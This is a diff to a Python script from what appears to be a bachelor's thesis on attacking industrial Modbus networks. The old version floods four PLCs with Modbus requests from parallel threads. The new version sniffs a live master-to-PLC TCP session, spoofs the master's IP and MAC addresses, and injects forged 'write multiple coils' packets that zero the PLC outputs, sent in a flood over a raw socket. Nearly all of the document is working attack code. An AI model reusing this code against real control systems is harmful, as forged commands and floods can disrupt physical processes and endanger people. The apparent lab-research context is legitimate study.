@@ -1,89 +1,138 @@
 # Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
-# File name: dos.py 
+# File name: injection-simple.py 
 # Authors: Jakub Kuzník <xkuzni04>
 # institution: VUT FIT 
-# Description:.
+# Description: Program is injecting wrong modbus packets.
+# Execution: ./injection.py num 
+#              where num is number of injected packets p.s. 
+#                    num == 0 ==> full speed 
 
+import sys
 from scapy.all import * 
-from pyModbusTCP.client import ModbusClient
-import threading
+import random 
+import socket
+from multiprocessing import Process
+import asyncio
 
-ATTACKER_IP = "192.168.88.199"
 
 # Device that i am attacking 
-SLAVE1 = "192.168.88.251"  # PLC2
-SLAVE2 = "192.168.88.252"  # PLC2
-SLAVE3 = "192.168.88.253"  # PLC2
-SLAVE4 = "192.168.88.254"  # PLC2
+PLC2          = "192.168.88.252"  # PLC2
+PLC2_MAC      = "b8:27:eb:1e:08:59"
+PLC2_UNIT_ID  = 1
+MASTER_IP     = "192.168.88.250"
+MASTER_MAC    = "1c:69:7a:08:86:1a"
+SERVER_PORT   = 502
+PACKET_P_S    = 0
 
-SERVER_PORT = 502
 
-THREADS_VALID_PACKETS = 4
-THREADS_INVALID_PACKETS = 4
+INTERFACE     = "eno2"
+pkt_global = ""
 
-# establish tcp connection with device 
-plc1 = ModbusClient(host=SLAVE1, port=SERVER_PORT)
-plc1.open()
-plc2 = ModbusClient(host=SLAVE2, port=SERVER_PORT)
-plc2.open()
-plc3 = ModbusClient(host=SLAVE3, port=SERVER_PORT)
-plc3.open()
-plc4 = ModbusClient(host=SLAVE4, port=SERVER_PORT)
-plc4.open()
 
-#while True:
+def stop_filter(pkt):
+    global pkt_global
+    pkt_global = pkt
+    print(pkt)
+    if IP in pkt and TCP in pkt:
+        if pkt[IP].dst == MASTER_IP and pkt[IP].src == PLC2 and pkt[TCP].sport == SERVER_PORT:
+            return True
+    return False
 
-# Define source and destination IP addresses
-src_ip = "192.168.88.199"
-dst_ip = "192.168.88.251"
+##
+# Sniff on network and find port that is already open (where there was tcp handshake )
+# return port, ack, seq 
+def findTcpStream():
+    sniff(iface=INTERFACE, stop_filter=stop_filter)
+    print(pkt_global)
+    print(pkt_global[TCP].dport)
+    return pkt_global[TCP].dport, pkt_global[TCP].ack, pkt_global[TCP].seq
 
-def build_packet(src_ip, dst_ip):
-  trans_id = 0x8345
-  protocol_id = 0x0000
-  length = 0x0006
-  unit_id = 0x01
-  function_code = 0x01
-  start_address = 0x0000
-  quantity = 0x0001
+## Will create a modbus packet 
+# 
+#
+# write 0 to every coil: 
+#   4c b1 00 00 00 08 01 0f 00 00 00 04 01 00
+def build_packet(src_ip, dst_ip, src_mac, dst_mac, transaction_id, lenght, unit_id, function_code, raw_data):
   
-  modbus_payload = struct.pack(">HHHBBHH", trans_id, protocol_id, length, unit_id, function_code, start_address, quantity)
+  ## lenght of raw data in bytes 
+  raw_data_len = lenght - 2
+  ## raw data in byte format 
+  raw_data_bytes = raw_data.to_bytes(raw_data_len, byteorder='big')
+
+  protocol_id = 0x0000
+
+  ## [tcp-sport, ack, seq]
+  params = findTcpStream()
+
+  ## I NEED TO SNIFF TCP PACKET BEFORE EACH SENDING 
+  # H = 2B
+  # B = 1B 
+  data_format = ">HHHBB" + str(raw_data_len) + "s"
+  
+  #modbus_payload = struct.pack(">HHHBBHHBB", transaction_id, protocol_id, lenght, unit_id, function_code, ref_code, bit_count, byte_count, data)
+
+  # assembly packet application layer 
+  modbus_payload = struct.pack(data_format, transaction_id, protocol_id, lenght, unit_id, function_code, raw_data_bytes)
+
   # Create IP and TCP headers
   ip_header = IP(src=src_ip, dst=dst_ip)
-  tcp_header = TCP(dport=502)
+
+  # 14 is size of tcp payload 
+  tcp_header = TCP(dport=SERVER_PORT, sport=params[0] , flags="PA", ack=(params[2] + 104), seq=params[1])
+
+  # Create Ethernet header
+  eth_header = Ether(src=src_mac, dst=dst_mac ,type=0x0800 )
 
   # Create Modbus/TCP packet
-  modbus_packet = ip_header / tcp_header / modbus_payload
+  modbus_packet = eth_header / ip_header / tcp_header / modbus_payload
+  modbus_packet.len = len(modbus_packet) - 14 # 14 is eth header
 
-  # Set the packet length
-  modbus_packet.len = len(modbus_packet)
-  
+  print(eth_header)
+  print(params)
+
+
   return modbus_packet
 
 
-def send_packet_in_thread_invalid():
-  while True:
-    modbus_packet1 = build_packet(ATTACKER_IP, SLAVE1)
-    modbus_packet2 = build_packet(ATTACKER_IP, SLAVE2)
-    modbus_packet3 = build_packet(ATTACKER_IP, SLAVE3)
-    modbus_packet4 = build_packet(ATTACKER_IP, SLAVE4)
-    send(modbus_packet1)
-    send(modbus_packet2)
-    send(modbus_packet3)
-    send(modbus_packet4)
+print(sys.argv)
+print(sys.argv[1])
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+s.bind((sys.argv[1], 0))
 
-def send_packet_in_thread_valid():
-  while True:
-    plc1.read_coils(4,4)
-    plc2.read_coils(4,4)
-    plc3.read_coils(4,4)
-    plc4.read_coils(4,4)
+async def dos():
+    global s
+    while True:
+        s.send(bytes(modbus_packet1), )
+        await asyncio.sleep(0)
 
-# Create 10 threads to send packets
-for i in range(THREADS_INVALID_PACKETS):
-    thread = threading.Thread(target=send_packet_in_thread_invalid, args=())
-    thread.start()
+async def main():
+    tasks = []
+    for i in range(50):
+        tasks.append(asyncio.create_task(dos()))
 
-# Create 10 threads to send packets
-for i in range(THREADS_VALID_PACKETS):
-    thread = threading.Thread(target=send_packet_in_thread_valid, args=())
-    thread.start()
+    await asyncio.gather(*tasks)
+
+
+while True:
+    transaction_id = random.randint(0, 65535)
+    lenght         = 0x0008
+    function_code  = 15
+    
+    # 6b write multile coils with zeros 
+    raw_data = 0x000000040100
+
+    modbus_packet1 = build_packet(MASTER_IP ,PLC2, MASTER_MAC, PLC2_MAC, transaction_id, lenght, PLC2_UNIT_ID, function_code, raw_data)
+
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s.bind(("eno2", 0))
+    asyncio.run(main())
+    exit
+
+
+
+
+
+
+
+
+    
